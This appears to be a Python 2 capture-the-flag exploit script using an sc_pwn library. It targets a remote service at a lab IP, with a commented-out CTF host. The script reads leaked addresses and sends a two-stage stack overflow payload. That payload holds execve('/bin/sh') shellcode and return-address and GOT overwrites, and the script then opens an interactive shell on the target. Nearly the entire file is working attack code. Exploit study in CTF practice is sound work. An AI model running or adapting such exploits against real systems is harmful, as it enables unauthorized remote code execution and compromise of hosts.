#!/usr/bin/env python
import sc_pwn
from struct import *
import sys

#rhp  = ("www.termsec.net", 17284)
rhp  = ("192.168.75.129", 8080)

addr_got_exit = 0x8049d10

#==========

def attack(nc):
    nc.read_until('you!')
    
    msg = nc.read_all().split(' ')
    addr_arg = map(lambda x:int(x,16),(msg[2],msg[4][:-1]))

    sys.stdout.write("[+]addr_arg0     = 0x%08x\n"%addr_arg[0])
    sys.stdout.write("[+]addr_arg1     = 0x%08x\n"%addr_arg[1])

    shellcode  = '\x31\xc9'                         # xor ecx,ecx
    shellcode += '\xbb'+pack('<I',addr_arg[1]+8)    # mov ebx, *(/bin/sh)
    shellcode += '\x6a\x0b'                         # push 0x0b
    shellcode += '\x58'                             # pop eax
    shellcode += '\xcd\x80'                         # int 0x80

    exploit_st1  = shellcode
    exploit_st1 += 'a'*(0x25-len(shellcode))
    exploit_st1 += pack('<I',0xcafebabe)    # ebp of main
    exploit_st1 += pack('<I',0xdeadbeef)    # return in copybuf
    exploit_st1 += pack('<I',addr_got_exit) # addr of arg0
    exploit_st1 += pack('<I',addr_arg[1])   # addr of arg1

    exploit_st2  = pack('<I',addr_arg[0])
    exploit_st2 += '\x00'*4
    exploit_st2 += '/bin/sh\x00'

    sys.stdout.write("[+]sending exploit....\n")
    nc.sendln(exploit_st1)
    nc.sendln(exploit_st2)

    nc.read_all()

#==========

if __name__=='__main__':
    nc = sc_pwn.Communicate(rhp)
    attack(nc)

    sh = sc_pwn.Shell(nc)
    sh.select()

    del(sh)
    del(nc)

#==========
